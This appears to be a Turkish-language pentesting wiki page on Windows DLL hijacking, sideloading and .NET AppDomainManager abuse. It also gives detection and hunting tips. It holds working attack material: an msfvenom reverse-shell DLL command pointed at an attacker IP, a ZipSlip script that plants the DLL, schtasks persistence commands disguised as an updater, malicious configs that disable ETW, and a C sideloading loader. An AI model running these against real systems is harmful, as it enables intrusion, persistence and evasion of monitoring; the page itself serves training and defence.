# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Temel Bilgiler

DLL Hijacking, güvenilen bir uygulamanın kötü amaçlı bir DLL yüklemesinin sağlanmasını içerir. Bu terim **DLL Spoofing, Injection ve Side-Loading** gibi çeşitli taktikleri kapsar. Genellikle kod yürütme ve kalıcılık sağlamak, daha nadiren de ayrıcalık yükseltmek için kullanılır. Burada ayrıcalık yükseltmeye odaklanılsa da hijacking yöntemi, amaç ne olursa olsun aynıdır.

### Yaygın Teknikler

DLL hijacking için çeşitli yöntemler kullanılır; her birinin etkinliği, uygulamanın DLL yükleme stratejisine bağlıdır:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Gerçek bir DLL'yi kötü amaçlı olanla değiştirmek; özgün DLL'nin işlevselliğini korumak için isteğe bağlı olarak DLL Proxying kullanmak.
2. **DLL Search Order Hijacking**: Kötü amaçlı DLL'yi, arama yolunda meşru DLL'den önce gelecek bir konuma yerleştirerek uygulamanın arama düzeninden yararlanmak.
3. **Phantom DLL Hijacking**: Uygulamanın mevcut olmayan, gerekli bir DLL sanarak yüklemesi için kötü amaçlı bir DLL oluşturmak.
4. **DLL Redirection**: Uygulamayı kötü amaçlı DLL'ye yönlendirmek için `%PATH%` veya `.exe.manifest` / `.exe.local` dosyaları gibi arama parametrelerini değiştirmek.
5. **WinSxS DLL Replacement**: Meşru DLL'yi WinSxS dizininde kötü amaçlı bir eşdeğeriyle değiştirmek; bu yöntem genellikle DLL side-loading ile ilişkilendirilir.
6. **Relative Path DLL Hijacking**: Kötü amaçlı DLL'yi, kopyalanmış uygulamayla birlikte kullanıcı denetimindeki bir dizine yerleştirmek; bu, Binary Proxy Execution tekniklerine benzer.

Bir uygulama **kendi DLL loader'ını** da uygulayabilir. Ayrıcalıklı bir süreç, `Libraries` veya `Plugins` gibi bir alt dizini listeleyip seçilen bir DLL'yi yardımcı bir programa iletebilir; bu işlem normal Windows DLL arama sırasından bağımsızdır. Başka bir hesap bu dizinde dosya oluşturabiliyorsa, bunu incelenmesi gereken bir ipucu olarak değerlendirin: süreç kimliğini, dizinin etkin ACL'sini, dosya seçme kuralını ve erişilebilir bir yükleme işlemi olup olmadığını doğrulayın. Bir çalıştırılabilir dosyanın yanındaki yazılabilir dizin, sürecin DLL'leri buradan yüklediğini kanıtlamaz.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}


### AppDomainManager hijacking (`<exe>.config` + saldırgan assembly'si)

Klasik DLL sideloading, güvenilen bir **.NET Framework** sürecine saldırgan kodu yükletmenin tek yolu değildir. Hedef çalıştırılabilir dosya **managed** bir uygulamaysa, CLR ayrıca çalıştırılabilir dosyanın adını taşıyan bir **uygulama yapılandırma dosyasına** (örneğin `Setup.exe.config`) bakar. Bu dosya özel bir **AppDomainManager** tanımlayabilir. Yapılandırma dosyası, EXE'nin yanına yerleştirilmiş ve saldırganın denetimindeki bir assembly'yi gösteriyorsa, CLR bunu **uygulamanın normal kod yolundan önce** yükler ve güvenilen süreç içinde çalıştırır.<sup>[[24]](#references)</sup>

Microsoft'un .NET Framework yapılandırma şemasına göre, özel manager'ın kullanılabilmesi için hem `<appDomainManagerAssembly>` hem de `<appDomainManagerType>` bulunmalıdır.<sup>[[16]](#references)[[17]](#references)</sup>

En küçük yapılandırma:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

Minimal yönetici:

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

Pratik notlar:
- Bu **.NET Framework'e özgü** bir tradecraft'tır. Win32 DLL arama sırasına değil, CLR yapılandırma ayrıştırmasına dayanır.
- Host gerçekten bir **managed EXE** olmalıdır. Hızlı triyaj için: `sigcheck -m target.exe`, `corflags target.exe` kullanın veya PE metadata'sında **CLR Runtime Header** olup olmadığını kontrol edin.
- Yapılandırma dosyasının adı yürütülebilir dosyanın adıyla tam olarak eşleşmelidir (`<binary>.config`) ve genellikle **EXE'nin yanında** bulunur.
- Bu yöntem **imzalı Microsoft/vendor binary'leriyle** kullanışlıdır; çünkü kötü amaçlı managed assembly süreç içinde çalışırken güvenilir EXE'ye dokunulmaz.
- Zaten yazılabilir bir installer/update dizininiz varsa AppDomainManager hijacking **ilk aşama** olarak kullanılabilir; sonraki aşamalarda klasik DLL sideloading veya reflective loading uygulanabilir.

### Downloader + zamanlanmış görev bootstrap'ı olarak AppDomainManager

Pratik bir intrusion modeli, güvenilir managed EXE'yi hem kötü amaçlı bir `*.config` dosyasıyla hem de yalnızca **küçük bir bootstrapper** görevi gören kötü amaçlı bir AppDomainManager DLL'siyle eşleştirmektir:<sup>[[25]](#references)</sup>

1. Kullanıcı, `%USERPROFILE%\Downloads` gibi inandırıcı bir konumdan imzalı bir .NET installer veya updater başlatır.
2. Yanındaki config, meşru uygulamanın mantığı başlamadan **önce** CLR'nin saldırganın assembly'sini yüklemesine neden olur.
3. Kötü amaçlı manager bir **path gate** uygular (örneğin, yalnızca host EXE `Downloads` konumundan çalışıyorsa devam eder ve ikinci aşamanın yalnızca `%LOCALAPPDATA%` konumundan çalışmasına izin verir).
4. Kontrol başarılı olursa payload'ı `%LOCALAPPDATA%\PerfWatson2.exe` gibi kullanıcının yazabildiği bir konuma indirir ve bir zamanlanmış görevle persistence kurar.

Bu varyantın önemi:
- İmzalı host EXE değişmeden kalır; bu nedenle yalnızca ana binary'nin hash'ini kontrol eden triyaj, ihlali gözden kaçırabilir.
- Basit **yol tabanlı anti-analysis** yaygındır: ZIP/EXE/DLL üçlüsünü Desktop, Temp veya sandbox konumuna taşımak zinciri kasıtlı olarak bozabilir.
- İlk aşamadaki AppDomainManager DLL'si küçük ve düşük profilli kalabilir; gerçek implant daha sonra indirilir.

Bu modelde sık görülen minimal persistence örneği:

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

Notlar:
- `/rl highest`, o kullanıcı/oturum için **kullanılabilir en yüksek** düzeyi ifade eder; tek başına SYSTEM düzeyine yükselmeyi garanti etmez.
- Bu teknik, klasik missing-DLL search-order hijacking'den ziyade **.NET config abuse yoluyla çalıştırma/kalıcılık** olarak sınıflandırılmaya daha uygundur; ancak operatörler genellikle her ikisini birlikte kullanır.

Tespit ipuçları:
- **ZIP'ten çıkarılan dizinlerden**, `Downloads`, `%TEMP%` veya kullanıcı tarafından yazılabilir diğer klasörlerden başlatılan ve aynı dizinde `<exe>.config` dosyası bulunan imzalı .NET yürütülebilir dosyaları.
- Eylemi `%LOCALAPPDATA%`, `%APPDATA%` veya `Downloads` içindeki bir konumu gösteren ve adları tarayıcı/üretici güncelleyicilerini taklit eden yeni zamanlanmış görevler.
- Hemen başka bir EXE indiren ve ardından `schtasks.exe` başlatan, kısa süre çalışan yönetilen bootstrap süreçleri.
- Yürütülebilir dosyanın yolu beklenen bir kullanıcı profili diziniyle eşleşmediğinde erken sonlanan örnekler.

### Sideload zincirini yeniden başlatmak için mevcut bir zamanlanmış görevi ele geçirme

Kalıcılık için yalnızca **yeni görev oluşturulmasını** aramayın. Bazı saldırı grupları, meşru bir yükleyicinin **normal bir güncelleme görevi** oluşturmasını bekler ve ardından görev eylemini **yeniden yazar**; böylece mevcut ad, yazar ve tetikleyici savunmacılara tanıdık görünmeye devam eder.

Yeniden kullanılabilir iş akışı:
1. Meşru yazılımı yükleyin/çalıştırın ve normalde oluşturduğu görevi belirleyin.
2. Görev XML'ini dışa aktarın ve mevcut `<Exec><Command>` / `<Arguments>` değerlerini not edin.<sup>[[23]](#references)</sup>
3. Yalnızca eylemi değiştirerek görevin, kullanıcı tarafından yazılabilir bir hazırlık dizinindeki **güvenilir ana makine EXE'nizi** başlatmasını sağlayın; bu EXE de gerçek yükü sideload eder veya AppDomain aracılığıyla yükler.
4. Bariz yeni bir kalıcılık izi oluşturmak yerine aynı görev adını yeniden kaydedin.

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

Neden daha gizlidir:
- Görev adı hâlâ meşru görünebilir (örneğin bir satıcı güncelleyicisi).
- **Task Scheduler hizmeti** görevi başlatır; bu nedenle üst süreç/ata süreç doğrulaması genellikle `explorer.exe` yerine beklenen zamanlama zincirini görür.
- Yalnızca **yeni görev adlarını** arayan DFIR ekipleri, kaydı zaten mevcut olan ancak eylemi artık `%LOCALAPPDATA%`, `%APPDATA%` veya saldırganın denetimindeki başka bir yolu gösteren bir görevi gözden kaçırabilir.

Hızlı inceleme noktaları:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- `C:\Windows\System32\Tasks\*` XML dosyalarını ve `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` meta verilerini bir temel çizgiyle karşılaştırın.
- **Satıcı güncelleyicisine benzeyen bir görev** **kullanıcının yazabildiği dizinlerden** çalıştığında veya yanındaki `*.config` dosyasını kullanan bir .NET EXE başlattığında uyarı oluşturun.

> [!TIP]
> HTML hazırlama, AES-CTR yapılandırmaları ve .NET implantlarını DLL sideloading üzerine katmanlandıran adım adım bir zincir için aşağıdaki iş akışını inceleyin.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Eksik DLL'leri bulma

Bir sistemdeki eksik DLL'leri bulmanın en yaygın yolu, sysinternals'tan [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) çalıştırıp **aşağıdaki 2 filtreyi ayarlamaktır**:

![Common Techniques - Eksik DLL'leri bulma: Bir sistemdeki eksik DLL'leri bulmanın en yaygın yolu, sysinternals'tan procmon çalıştırıp aşağıdaki 2 filtreyi ayarlamaktır](<../../../images/image (961).png>)

![Common Techniques - Eksik DLL'leri bulma: Bir sistemdeki eksik DLL'leri bulmanın en yaygın yolu, sysinternals'tan procmon çalıştırıp aşağıdaki 2 filtreyi ayarlamaktır](<../../../images/image (230).png>)

ve yalnızca **File System Activity**'yi gösterin:

![Common Techniques - Eksik DLL'leri bulma: ve yalnızca File System Activity'yi gösterin](<../../../images/image (153).png>)

**Genel olarak eksik DLL'leri** arıyorsanız, bunu birkaç **saniye** çalışır durumda **bırakın**.\
**Belirli bir çalıştırılabilir dosyanın içindeki eksik bir DLL'yi** arıyorsanız, **"Process Name" "contains" `<exec name>`** gibi başka bir filtre ayarlayın, dosyayı çalıştırın ve olayları yakalamayı durdurun.<sup>[[9]](#references)</sup>

## Eksik DLL'leri istismar etme

Yetkileri yükseltmek için, ayrıcalıklı bir sürecin yazabildiğiniz bir konumdan yüklemeye çalıştığı bir **DLL** arayın. Bu durum, meşru DLL'yi içeren dizinden önce aranan bir dizini denetlemeniz veya istenen DLL mevcut olmadığında aranan dizinlerden birine yazabilmeniz halinde gerçekleşebilir.

### DLL Arama Sırası

**[Microsoft belgelerinde](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) DLL'lerin nasıl yüklendiğini ayrıntılı olarak görebilirsiniz.**

**Windows uygulamaları**, önceden tanımlanmış arama yollarını belirli bir sırayla izleyerek DLL'leri arar. DLL hijacking sorunu, zararlı bir DLL'nin bu dizinlerden birine stratejik olarak yerleştirilmesi ve böylece gerçek DLL'den önce yüklenmesinden kaynaklanır. Bunu önlemek için uygulamanın ihtiyaç duyduğu DLL'lere başvururken mutlak yollar kullandığından emin olun.

Aşağıda **32-bit** sistemlerdeki **DLL arama sırasını** görebilirsiniz:

1. Uygulamanın yüklendiği dizin.
2. Sistem dizini. Bu dizinin yolunu almak için [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) işlevini kullanın.(_C:\Windows\System32_)
3. 16-bit sistem dizini. Bu dizinin yolunu alan bir işlev yoktur, ancak bu dizin aranır. (_C:\Windows\System_)
4. Windows dizini. Bu dizinin yolunu almak için [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) işlevini kullanın.
   1. (_C:\Windows_)
5. Geçerli dizin.
6. PATH ortam değişkeninde listelenen dizinler. Bunun, **App Paths** kayıt defteri anahtarında belirtilen uygulamaya özel yolu içermediğini unutmayın. DLL arama yolu hesaplanırken **App Paths** anahtarı kullanılmaz.

Bu, **SafeDllSearchMode** etkin durumdayken kullanılan **varsayılan** arama sırasıdır. Devre dışı bırakıldığında geçerli dizin ikinci sıraya yükselir. Bu özelliği devre dışı bırakmak için **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** kayıt defteri değerini oluşturun ve 0 olarak ayarlayın (varsayılan olarak etkindir).

[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) işlevi **LOAD_WITH_ALTERED_SEARCH_PATH** ile çağrılırsa arama, **LoadLibraryEx**'in yüklediği yürütülebilir modülün bulunduğu dizinde başlar.

Son olarak, DLL adı yerine mutlak yolu kullanılarak yüklenebilir. Bu durumda Windows, DLL'nin kendisini yalnızca belirtilen yolda arar; adıyla istenen bağımlılıklar yine geçerli arama sırasını izler.

Arama sırasını değiştirmek için başka yöntemler de var, ancak bunları burada açıklamayacağım.

### Rastgele dosya yazma yeteneğini eksik DLL hijack'iyle zincirleme

**İlgili teknik:** [oplock-gated mount-point switching against privileged remediation](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. Sürecin aradığı ancak bulamadığı DLL adlarını toplamak için **ProcMon** filtrelerini kullanın (`Process Name` = hedef EXE, `Path` `.dll` ile bitiyor, `Result` = `NAME NOT FOUND`).<sup>[[14]](#references)</sup>
2. İkili dosya **zamanlanmış olarak/hizmet şeklinde** çalışıyorsa, bu adlardan birini taşıyan DLL'yi **uygulama dizinine** (arama sırasındaki #1. konum) bırakmak, DLL'nin sonraki çalıştırmada yüklenmesini sağlar. Bir .NET tarayıcı örneğinde süreç, gerçek kopyayı `C:\Program Files\dotnet\fxr\...` konumundan yüklemeden önce `C:\samples\app\` içinde `hostfxr.dll` arıyordu.
3. Herhangi bir export'a (ör. reverse shell) sahip bir payload DLL oluşturun: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. İlkeliniz **ZipSlip tarzı rastgele yazma** ise DLL'nin uygulama klasörüne bırakılmasını sağlayacak şekilde, çıkarma dizininin dışına çıkan bir ZIP girdisi hazırlayın:

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. Arşivi izlenen gelen kutusuna/paylaşıma bırakın; zamanlanmış görev süreci yeniden başlattığında, süreç kötü amaçlı DLL’i yükler ve kodunuzu service account olarak çalıştırır.

### RTL_USER_PROCESS_PARAMETERS.DllPath aracılığıyla sideloading’i zorlama

Yeni oluşturulan bir sürecin DLL arama yolunu deterministik olarak etkilemenin gelişmiş bir yolu, süreci ntdll’in yerel API’leriyle oluştururken RTL_USER_PROCESS_PARAMETERS içindeki DllPath alanını ayarlamaktır. Burada saldırganın kontrolündeki bir dizini belirtmek, adıyla içe aktarılan bir DLL’i çözen (mutlak yol kullanmayan ve güvenli yükleme bayraklarını kullanmayan) hedef sürecin bu dizindeki kötü amaçlı DLL’i yüklemesini sağlayabilir.

Temel fikir
- RtlCreateProcessParametersEx ile süreç parametrelerini oluşturun ve denetiminizdeki klasörü (ör. dropper/unpacker’ınızın bulunduğu dizini) gösteren özel bir DllPath sağlayın.
- RtlCreateUserProcess ile süreci oluşturun. Hedef ikili bir DLL’i adıyla çözümlerken, yükleyici çözümleme sırasında sağlanan DllPath’e başvurur; böylece kötü amaçlı DLL hedef EXE ile aynı dizinde olmasa bile güvenilir biçimde sideloading yapılabilir.

Notlar/sınırlamalar
- Bu, oluşturulan alt süreci etkiler; yalnızca geçerli süreci etkileyen SetDllDirectory’den farklıdır.
- Hedef, bir DLL’i adıyla içe aktarmalı veya LoadLibrary çağırmalıdır (mutlak yol kullanmamalı ve LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories kullanmamalıdır).
- KnownDLLs ve sabit kodlanmış mutlak yollar hijack edilemez. Forwarded exports ve SxS, öncelik sırasını değiştirebilir.

En küçük C örneği (ntdll, wide strings, basitleştirilmiş hata işleme):

<details>
<summary>Eksiksiz C örneği: RTL_USER_PROCESS_PARAMETERS.DllPath aracılığıyla DLL sideloading’i zorlama</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

Operasyonel kullanım örneği
- Gerekli işlevleri dışa aktaran veya gerçek DLL'ye proxy oluşturan kötü amaçlı bir xmllite.dll dosyasını DllPath dizininize yerleştirin.
- Yukarıdaki tekniği kullanarak xmllite.dll dosyasını adıyla aradığı bilinen imzalı bir binary başlatın. Loader, import'u belirtilen DllPath üzerinden çözümler ve DLL'nizi sideload eder.

Bu tekniğin, çok aşamalı sideloading zincirlerini yürütmek için gerçek saldırılarda kullanıldığı gözlemlenmiştir: İlk başlatıcı bir yardımcı DLL bırakır; bu DLL de özel bir DllPath ile Microsoft tarafından imzalanmış ve hijack edilebilir bir binary başlatarak saldırganın DLL'sinin bir hazırlama dizininden yüklenmesini sağlar.<sup>[[6]](#references)</sup>


### `.exe.config` üzerinden .NET AppDomainManager hijacking

**.NET Framework** hedeflerinde sideloading, belleğe yama uygulamadan **`Main()` öncesinde**, uygulamanın yanındaki **`.exe.config`** dosyasının kötüye kullanılmasıyla gerçekleştirilebilir. Saldırgan, yalnızca Win32 DLL arama sırasına güvenmek yerine meşru bir .NET EXE dosyasını kötü amaçlı bir config dosyası ve saldırganın kontrolündeki bir veya daha fazla assembly ile yan yana yerleştirir.

Zincirin işleyişi:<sup>[[15]](#references)[[22]](#references)</sup>
1. Ana EXE başlatılır ve **CLR, `<exe>.config` dosyasını okur**.
2. Config, çalışma zamanının saldırganın kontrolündeki bir `AppDomainManager` örneği oluşturması için **`<appDomainManagerAssembly>`** ve **`<appDomainManagerType>`** değerlerini ayarlar.
3. Kötü amaçlı manager, güvenilir ana süreçte **`Main()` öncesinde kod yürütür**.
4. Aynı config, CLR'yi önce yerel assembly'leri çözümlemeye zorlayabilir (örneğin `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) ve inline yama uygulamadan çalışma zamanı doğrulamasını/telemetriyi zayıflatabilir.

Kampanya tarzı örüntü (iç içe yerleşim, yönergeye / CLR sürümüne göre değişebilir):

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

Neden yararlıdır:
- **`<probing privatePath="."/>`**, assembly çözümlemesini uygulama dizininde tutarak bu klasörü öngörülebilir bir sideloading yüzeyine dönüştürür.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`**, meşru uygulama mantığı çalışmadan önce, CLR başlatılırken yürütmeyi saldırgan koduna taşır.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`**, tam güvenilen bir uygulamanın strong-name doğrulama hatası olmadan imzasız veya kurcalanmış assembly’leri yüklemesini sağlayabilir.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`**, publisher-policy yönlendirmeleriyle daha yeni assembly’lere geçilmesini önler.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`**, runtime seçimini daha öngörülebilir hâle getirir.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`**, özellikle dikkat çekicidir; çünkü implantın bellekte `EtwEventWrite` işlevine yama uygulaması yerine, yapılandırma üzerinden **CLR kendi ETW görünürlüğünü devre dışı bırakır**.

Yakın tarihli kampanyalarda görülen operasyonel model:
- Aşama 1, `setup.exe`, `setup.exe.config` ve yerel assembly’leri bırakır.
- Aşama 2, bunları inandırıcı görünen bir **AppData update** klasörüne kopyalar, ana dosyanın adını `update.exe` gibi bir şeyle değiştirir ve **scheduled task** aracılığıyla yeniden başlatır.
- Aşama 3, son RAT DLL/export’unu yüklemeden önce yürütme bağlamını (örneğin Task Scheduler’dan beklenen üst süreç `svchost.exe`) doğrular.

Avlanma fikirleri:
- Kullanıcıların yazabildiği konumlarda, şüpheli bitişik **`.config`** dosyalarıyla çalışan imzalı veya başka şekilde meşru **.NET yürütülebilir dosyaları**.
- **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** veya **`etwEnable enabled="false"`** içeren `.config` dosyaları.
- Yeniden adlandırılmış update ikililerini **`%LOCALAPPDATA%`** veya uygulamaya özgü `\bin\update\` dizinlerinden yeniden başlatan scheduled task’ler.
- Bir scheduled task’in güvenilir bir .NET host’u başlattığı ve bu host’un hemen kendi dizinindeki satıcıya ait olmayan assembly’leri yüklediği üst/alt süreç zincirleri.

#### Windows belgelerindeki DLL arama sırasına ilişkin istisnalar

Windows belgelerinde, standart DLL arama sırasına ilişkin belirli istisnalar belirtilmiştir:

- Belleğe önceden yüklenmiş bir DLL ile aynı ada sahip bir **DLL** ile karşılaşıldığında sistem olağan aramayı atlar. Bunun yerine, bellekteki DLL’ye dönmeden önce yönlendirme ve manifest denetimi yapar. **Bu durumda sistem DLL için arama yapmaz**.
- DLL, geçerli Windows sürümü için bir **bilinen DLL** olarak tanınıyorsa sistem, arama sürecini **atlayarak** bilinen DLL’nin kendi sürümünü ve bağımlı DLL’lerini kullanır. Bu bilinen DLL’lerin listesi **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** kayıt defteri anahtarında bulunur.
- Bir **DLL’nin bağımlılıkları** varsa, bu bağımlı DLL’ler için arama, ilk DLL tam bir yol üzerinden tanımlanmış olsa bile, yalnızca **modül adları** belirtilmiş gibi yapılır.

### Yetki Yükseltme

**Gereksinimler**:

- **Farklı yetkilerle** (yatay veya yanal hareket) çalışan ya da çalışacak olan ve **bir DLL’si eksik** bir süreç belirleyin.
- **DLL’nin** aranacağı herhangi bir **dizinde** **yazma erişimi** olduğundan emin olun. Bu konum, yürütülebilir dosyanın dizini veya sistem yolundaki bir dizin olabilir.

Bu ön koşullar varsayılan olarak nadiren bir arada bulunur: ayrıcalıklı yürütülebilir dosyaların eksik DLL bağımlılıkları genellikle olmaz ve standart kullanıcılar normalde sistem arama yolu dizinlerine yazamaz. Yine de yanlış yapılandırılmış ortamlar her iki koşulu da ortaya çıkarabilir.\
Gereksinimler karşılanıyorsa [UACME](https://github.com/hfiref0x/UACME) projesine göz atın. Projenin temel amacı UAC bypass olsa da belirli Windows sürümleri için DLL hijacking PoC’leri içerir; bunlar bulduğunuz yazılabilir dizine sıklıkla uyarlanabilir.

Bir klasördeki **izinlerinizi** şu şekilde **kontrol edebileceğinizi** unutmayın:<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

Ve **PATH içindeki tüm klasörlerin izinlerini kontrol edin**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Bir executable'ın importlarını ve bir DLL'in exportlarını şu komutla da kontrol edebilirsiniz:

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

**System Path klasöründe** yazma izinlerine sahip olarak **DLL Hijacking'i ayrıcalıkları yükseltmek için nasıl kötüye kullanabileceğinize** dair kapsamlı bir kılavuz için şuraya göz atın:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Otomatik araçlar

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS), system PATH içindeki herhangi bir klasör üzerinde yazma izniniz olup olmadığını kontrol eder.\
Bu zafiyeti keşfetmek için kullanılabilecek diğer ilgi çekici otomatik araçlar **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ ve _Write-HijackDll_'dır.

### Örnek

İstismar edilebilir bir senaryo bulursanız, bunu başarıyla istismar etmek için en önemli şeylerden biri **yürütülebilir dosyanın bu dosyadan içe aktaracağı tüm işlevleri dışa aktaran bir dll oluşturmaktır**. Her durumda, DLL Hijacking'in [Medium Integrity seviyesinden High seviyesine **(UAC'yi atlatarak)**](../../authentication-credentials-uac-and-efs/index.html#uac) veya [**High Integrity seviyesinden SYSTEM'e**](../index.html#from-high-integrity-to-system)** yükselmek** için kullanışlı olduğunu unutmayın. Yürütme için DLL hijacking'e odaklanan bu DLL hijacking çalışmasında **geçerli bir dll'nin nasıl oluşturulacağına** dair bir örnek bulabilirsiniz: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Ayrıca, **sonraki bölümde** **şablon olarak** veya **gerekli olmayan işlevleri dışa aktaran bir dll oluşturmak için** kullanışlı olabilecek bazı **temel dll kodları** bulabilirsiniz.

## **DLL'leri oluşturma ve derleme**

### **DLL Proxifying**

Temel olarak bir **DLL proxy**, **yüklendiğinde kötü amaçlı kodunuzu çalıştırabilen**, aynı zamanda **gerçek kütüphaneye yapılan tüm çağrıları ileterek** bu kütüphanenin **beklendiği gibi çalışmasını ve işlevlerini sunmasını sağlayan** bir DLL'dir.

[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) veya [**Spartacus**](https://github.com/Accenture/Spartacus) aracıyla bir yürütülebilir dosya belirtip proxify etmek istediğiniz kütüphaneyi seçebilir ve **proxified dll oluşturabilir** ya da bir **DLL belirtip** **proxified dll oluşturabilirsiniz**.

### **Meterpreter**

**Rev shell al (x64):**

```bash
